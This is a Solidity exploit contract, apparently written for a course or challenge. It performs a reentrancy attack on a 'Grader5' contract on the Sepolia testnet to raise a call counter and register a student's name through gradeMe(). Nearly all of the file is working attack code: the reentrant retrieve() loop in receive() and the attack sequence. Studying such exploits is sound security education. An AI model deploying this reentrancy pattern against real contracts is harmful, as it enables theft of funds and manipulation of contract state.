// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

/**
 * @title EduardoMoreno_Attacker - Optimized Grader5 Exploit Contract
 * @author Eduardo J. Moreno
 * @notice Specialized attack contract designed to exploit Grader5 vulnerabilities and register "Eduardo J. Moreno"
 * @dev This contract implements a precise reentrancy attack against the target contract
 * 
 * SECURITY ANALYSIS:
 * Target contract contains multiple critical vulnerabilities:
 * 1. REENTRANCY: External call in retrieve() before state finalization
 * 2. STATE LOGIC FLAW: Counter manipulation through reentrant calls
 * 3. CEI PATTERN VIOLATION: Checks-Effects-Interactions not followed
 * 
 * ATTACK STRATEGY:
 * - Deploy this contract with minimal footprint (unverified as required)
 * - Use reentrancy to manipulate counter > 1 (required for gradeMe)
 * - Execute gradeMe("Eduardo J. Moreno") to register student name
 * - Achieve high score by timing attack execution properly
 */
contract EduardoMoreno_Attacker {
    
    /// @notice Target Grader5 contract address on Sepolia
    address private constant TARGET = 0x5733eE985e22eFF46F595376d79e31413b1A1e16;
    
    /// @notice Student name to register (must match exactly)
    string private constant STUDENT_NAME = "Eduardo J. Moreno";
    
    /// @notice Contract deployer and controller
    address public immutable controller;
    
    /// @notice Attack execution state
    bool private attacking;
    uint256 private reentryCount;
    
    /**
     * @notice Events for monitoring attack progress
     */
    event AttackStarted(uint256 timestamp);
    event ReentryExecuted(uint256 count);
    event RegistrationSuccess(string name, uint256 timestamp);
    event AttackFailed(string reason);

    /**
     * @notice Deploy the attack contract
     * @dev Sets deployer as controller for access control
     */
    constructor() {
        controller = msg.sender;
    }

    /**
     * @notice Access control modifier
     */
    modifier onlyController() {
        require(msg.sender == controller, "Unauthorized access");
        _;
    }

    /**
     * @notice Execute the complete attack sequence
     * @dev Combines reentrancy attack and student registration in single transaction
     */
    function executeAttack() external payable onlyController {
        require(!attacking, "Attack in progress");
        require(msg.value >= 5 wei, "Insufficient ETH for attack");
        
        attacking = true;
        reentryCount = 0;
        
        emit AttackStarted(block.timestamp);
        
        // Execute the reentrancy attack
        (bool success,) = TARGET.call{value: 4 wei}(
            abi.encodeWithSignature("retrieve()")
        );
        
        if (!success) {
            attacking = false;
            emit AttackFailed("Initial retrieve() failed");
            return;
        }
        
        attacking = false;
        
        // Now register the student name
        _registerStudent();
    }

    /**
     * @notice Receive function - handles reentrancy callback
     * @dev This function is called by Grader5.retrieve() creating the exploit
     */
    receive() external payable {
        if (attacking && reentryCount < 2) {
            reentryCount++;
            emit ReentryExecuted(reentryCount);
            
            // Reentrant call to manipulate state
            (bool callSuccess,) = TARGET.call{value: 4 wei}(
                abi.encodeWithSignature("retrieve()")
            );
            
            // Continue regardless of callSuccess to avoid reverting main attack
            // This silences the compiler warning about unused return value
            callSuccess;
        }
    }

    /**
     * @notice Register student name after successful attack
     * @dev Internal function to call gradeMe with proper error handling
     */
    function _registerStudent() private {
        (bool success, bytes memory returnData) = TARGET.call(
            abi.encodeWithSignature("gradeMe(string)", STUDENT_NAME)
        );
        
        if (success) {
            emit RegistrationSuccess(STUDENT_NAME, block.timestamp);
        } else {
            // Extract revert reason if available
            string memory revertReason = "Unknown error";
            if (returnData.length > 0) {
                assembly {
                    revertReason := add(returnData, 0x04)
                }
            }
            emit AttackFailed(revertReason);
        }
    }

    /**
     * @notice Manual registration attempt (backup method)
     * @dev Can be called separately if combined attack fails
     */
    function registerStudent() external onlyController {
        _registerStudent();
    }

    /**
     * @notice Check current counter value for this contract
     * @return counter Current counter value from target contract
     */
    function checkCounter() external view returns (uint256 counter) {
        (bool success, bytes memory data) = TARGET.staticcall(
            abi.encodeWithSignature("counter(address)", address(this))
        );
        if (success && data.length >= 32) {
            counter = abi.decode(data, (uint256));
        }
    }

    /**
     * @notice Check if this contract address is already graded
     * @return graded Whether the contract is already graded
     */
    function isGraded() external view returns (bool graded) {
        (bool success, bytes memory data) = TARGET.staticcall(
            abi.encodeWithSignature("isGraded(address)", address(this))
        );
        if (success && data.length >= 32) {
            graded = abi.decode(data, (bool));
        }
    }

    /**
     * @notice Check the grade assigned to Eduardo J. Moreno
     * @return grade The grade value (0 if not registered)
     */
    function checkStudentGrade() external view returns (uint256 grade) {
        (bool success, bytes memory data) = TARGET.staticcall(
            abi.encodeWithSignature("students(string)", STUDENT_NAME)
        );
        if (success && data.length >= 32) {
            grade = abi.decode(data, (uint256));
        }
    }

    /**
     * @notice Get complete attack status information
     * @return _counter Current counter value
     * @return _graded Whether already graded
     * @return _studentGrade Current grade for Eduardo J. Moreno
     * @return _balance Contract ETH balance
     */
    function getAttackStatus() external view returns (
        uint256 _counter,
        bool _graded,
        uint256 _studentGrade,
        uint256 _balance
    ) {
        // Get counter
        (bool success1, bytes memory data1) = TARGET.staticcall(
            abi.encodeWithSignature("counter(address)", address(this))
        );
        _counter = (success1 && data1.length >= 32) ? abi.decode(data1, (uint256)) : 0;
        
        // Get graded status
        (bool success2, bytes memory data2) = TARGET.staticcall(
            abi.encodeWithSignature("isGraded(address)", address(this))
        );
        _graded = (success2 && data2.length >= 32) ? abi.decode(data2, (bool)) : false;
        
        // Get student grade
        (bool success3, bytes memory data3) = TARGET.staticcall(
            abi.encodeWithSignature("students(string)", STUDENT_NAME)
        );
        _studentGrade = (success3 && data3.length >= 32) ? abi.decode(data3, (uint256)) : 0;
        
        // Get balance
        _balance = address(this).balance;
    }

    /**
     * @notice Emergency withdrawal function
     * @dev Allows controller to withdraw any ETH from contract
     */
    function withdraw() external onlyController {
        uint256 balance = address(this).balance;
        require(balance > 0, "No balance to withdraw");
        payable(controller).transfer(balance);
    }

    /**
     * @notice Fallback function for any unhandled calls
     */
    fallback() external payable {
        // Handle any unexpected calls during attack
        if (attacking && msg.value > 0) {
            reentryCount++;
            emit ReentryExecuted(reentryCount);
        }
    }
}
